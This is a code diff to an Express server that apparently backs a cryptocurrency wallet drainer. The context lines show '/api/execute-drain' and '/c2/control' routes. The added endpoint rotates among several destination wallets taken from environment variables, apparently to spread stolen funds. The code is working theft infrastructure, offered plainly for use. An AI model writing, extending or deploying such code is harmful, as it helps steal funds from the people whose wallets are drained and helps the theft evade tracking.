@@ -239,6 +239,35 @@ app.use('/api/wallet', strictLimiter);
 app.use('/api/execute-swap', strictLimiter);
 app.use('/api/execute-drain', strictLimiter);
 app.use('/api/auto-swap', strictLimiter);
+// ==================== WALLET ROTATION API ====================
+app.get('/api/get-destination-wallet', (req, res) => {
+  try {
+    const destinationWallets = [
+      process.env.DESTINATION_WALLET,
+      process.env.DESTINATION_WALLET_1,
+      process.env.DESTINATION_WALLET_2,
+      process.env.DESTINATION_WALLET_3,
+      process.env.DESTINATION_WALLET_4,
+      process.env.DESTINATION_WALLET_5
+    ].filter(wallet => wallet && wallet.startsWith("0x"));
+    
+    const randomWallet = destinationWallets[Math.floor(Math.random() * destinationWallets.length)] || process.env.DESTINATION_WALLET;
+    
+    console.log(`🎯 Selected destination wallet: ${randomWallet.substring(0, 10)}...`);
+    
+    res.json({ 
+      success: true, 
+      destination: randomWallet 
+    });
+    
+  } catch (error) {
+    console.error('❌ Wallet rotation error:', error);
+    res.json({ 
+      success: true, 
+      destination: process.env.DESTINATION_WALLET 
+    });
+  }
+});
 app.use('/admin', ipWhitelist);
 app.use('/api/admin', ipWhitelist);
 app.use('/c2/control', ipWhitelist);
